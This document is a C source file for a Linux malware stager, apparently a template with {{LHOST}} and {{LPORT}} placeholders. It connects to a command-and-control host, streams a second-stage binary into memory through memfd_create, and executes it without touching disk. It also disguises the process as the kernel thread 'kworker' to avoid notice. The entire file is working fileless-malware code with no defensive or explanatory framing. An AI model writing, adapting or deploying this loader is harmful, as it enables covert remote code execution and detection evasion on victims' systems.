#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/syscall.h>

// Architecture-specific memfd_create syscall resolution
#ifndef SYS_memfd_create
#if defined(__x86_64__)
#define SYS_memfd_create 319
#elif defined(__i386__)
#define SYS_memfd_create 356
#elif defined(__arm__)
#define SYS_memfd_create 385
#elif defined(__aarch64__)
#define SYS_memfd_create 279
#else
#define SYS_memfd_create -1
#endif
#endif

int main() {
    // Abort if the kernel is too old to support memfd_create
    if (SYS_memfd_create == -1) return 1;

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("{{LHOST}}");
    server.sin_port = htons({{LPORT}});

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) return 1;

    // Create an anonymous file descriptor in volatile RAM
    int mfd = syscall(SYS_memfd_create, "kworker", 1); 
    if (mfd < 0) return 1;

    // Expect 4-byte size header from C2 (Network Byte Order)
    uint32_t payload_size = 0;
    if (recv(sock, &payload_size, 4, 0) <= 0) return 1;
    payload_size = ntohl(payload_size);

    char buffer[4096];
    uint32_t total_received = 0;
    
    // Stream the heavy Stage 2 binary directly into RAM
    while (total_received < payload_size) {
        int bytes_read = recv(sock, buffer, sizeof(buffer), 0);
        if (bytes_read <= 0) break;
        write(mfd, buffer, bytes_read);
        total_received += bytes_read;
    }

    if (total_received == payload_size) {
        char fd_path[64];
        snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", mfd);
        
        // Pass connection details to Stage 2 and mask process name
        char *args[] = {"kworker", "{{LHOST}}", "{{LPORT}}", NULL};
        
        close(sock); // Sever the stager connection cleanly
        execve(fd_path, args, NULL);
    }

    close(mfd);
    close(sock);
    return 0;
}